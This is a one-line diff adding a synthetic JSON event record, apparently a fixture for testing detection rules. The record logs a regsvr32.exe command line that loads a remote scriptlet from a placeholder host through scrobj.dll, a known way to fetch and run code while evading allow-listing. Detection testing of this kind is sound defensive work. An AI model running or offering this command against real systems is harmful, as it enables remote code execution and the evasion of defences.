@@ -1,0 +1,1 @@
+{"schema_version":1,"synthetic":true,"event":{"FileName":"regsvr32.exe","ProcessCommandLine":"regsvr32.exe -s -n -u -i:http://example.invalid/sample.sct scrobj.dll"}}
